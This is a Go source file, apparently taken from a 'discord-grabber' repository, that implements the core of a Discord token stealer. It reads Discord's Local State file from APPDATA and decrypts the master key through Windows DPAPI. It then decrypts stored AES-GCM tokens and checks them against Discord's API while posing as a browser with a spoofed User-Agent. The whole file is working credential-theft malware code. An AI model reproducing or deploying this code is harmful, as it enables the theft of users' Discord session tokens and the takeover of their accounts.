package main

// from: https://github.com/faceslog/discord-grabber-go/blob/main/main.go

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"io/ioutil"
	"net/http"
	"os"
	"unsafe"

	"golang.org/x/sys/windows"
)

type JsonKeyFile struct {
	Crypt OSCrypt `json:"os_crypt"`
}

type OSCrypt struct {
	EncryptedKey string `json:"encrypted_key"`
}

func getRequest(url string, isChecking bool, token string) (body string, err error) {
	// Setup the Request
	req, err := http.NewRequest("GET", url, nil)
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36 Edg/88.0.705.74")
	req.Header.Set("Content-Type", "application/json")
	if isChecking {
		req.Header.Set("Authorization", token)
	}

	if err != nil {
		return
	}

	client := &http.Client{}
	response, err := client.Do(req)

	if err != nil {
		return
	}

	if response.StatusCode != 200 {
		err = fmt.Errorf("GET %s Responded with status code: %d\n", url, response.StatusCode)
		return
	}

	defer func(Body io.ReadCloser) {
		err := Body.Close()
		if err != nil {

		}
	}(response.Body)

	b, err := io.ReadAll(response.Body)
	if err != nil {
		return
	}

	body = string(b)
	return
}

func get_token_info(token string) (string, bool) {

	// Check if the token is a valid discord token !
	res, err := getRequest("https://discord.com/api/v9/users/@me", true, token)
	return res, err == nil
}

func bytesToBlob(bytes []byte) *windows.DataBlob {
	blob := &windows.DataBlob{Size: uint32(len(bytes))}
	if len(bytes) > 0 {
		blob.Data = &bytes[0]
	}
	return blob
}

func Decrypt(data []byte) ([]byte, error) {

	out := windows.DataBlob{}
	var outName *uint16

	err := windows.CryptUnprotectData(bytesToBlob(data), &outName, nil, 0, nil, 0, &out)
	if err != nil {
		return nil, fmt.Errorf("unable to decrypt DPAPI protected data: %w", err)
	}
	ret := make([]byte, out.Size)
	copy(ret, unsafe.Slice(out.Data, out.Size))

	windows.LocalFree(windows.Handle(unsafe.Pointer(out.Data)))
	windows.LocalFree(windows.Handle(unsafe.Pointer(outName)))

	return ret, nil
}
func getMasterKey() ([]byte, error) {

	jsonFile := os.Getenv("APPDATA") + "/discord/Local State"

	byteValue, err := ioutil.ReadFile(jsonFile)
	if err != nil {
		return nil, fmt.Errorf("could not read json file")
	}

	var fileData JsonKeyFile
	err = json.Unmarshal(byteValue, &fileData)
	if err != nil {
		return nil, fmt.Errorf("Could not parse json")
	}

	baseEncryptedKey := fileData.Crypt.EncryptedKey
	encryptedKey, e := base64.StdEncoding.DecodeString(baseEncryptedKey)
	if e != nil {
		return nil, fmt.Errorf("Could not decode base64")
	}
	encryptedKey = encryptedKey[5:]

	key, err := Decrypt(encryptedKey)
	if err != nil {
		return nil, fmt.Errorf("Cryptunprotectdata decryption Failed ")
	}

	return key, nil
}
func decryptToken(buffer []byte) (string, error) {

	iv := buffer[3:15]
	payload := buffer[15:]

	key, err := getMasterKey()
	if err != nil {
		return "", err
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}

	ivSize := len(iv)
	if len(payload) < ivSize {
		return "", fmt.Errorf("incorrect iv, iv is too big")
	}

	plaintext, err := aesGCM.Open(nil, iv, payload, nil)
	if err != nil {
		return "", err
	}

	return string(plaintext), nil
}
